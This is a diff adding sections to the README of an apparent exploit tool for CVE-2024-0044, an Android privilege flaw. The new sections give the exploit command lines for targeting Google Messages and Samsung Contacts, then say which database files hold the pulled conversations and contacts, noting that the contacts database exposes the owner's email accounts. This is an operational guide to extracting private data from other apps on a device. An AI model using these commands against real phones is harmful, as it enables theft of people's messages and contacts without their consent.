@@ -101,6 +101,21 @@ You can use [Whatsapp chat exporter](https://github.com/KnugiHK/Whatsapp-Chat-Ex
 
 This allows you to get whatsapp data without a root access on your device
 
+# Pulling google messages
+
+Just changes the package name as follows
+```
+plaintext@archlinux ~/D/c/p/cve_2024_0044 (feature)> python3 ./cve_2024_0044.py -P com.google.android.apps.messaging -A ~/Down
+loads/F-Droid.apk
+```
+Follow the above instructions for whatsapp messages and after pulling the  `wa.tar` file untar it and open the conversations in  `com.google.android.apps.messaging/databases/bugle_db` using sqlitebrowser or any other tool
+
+# Pulling contacts
+tested for samsung device. for other devices check the package name for the contacts provider.
+```
+plaintext@archlinux ~/D/c/p/cve_2024_0044 (feature)> python3 ./cve_2024_0044.py -P com.samsung.android.app.contacts -A ~/Downloads/F-Droid.apk
+```
+Follow the above instructions for whatsapp messages and after pulling the  `wa.tar` file untar it and open the contacts in  `com.samsung.android.providers.contacts/databases/contacts2.db` using sqlitebrowser or any other tool. The db file contains all the user email accounts info
 
 
 
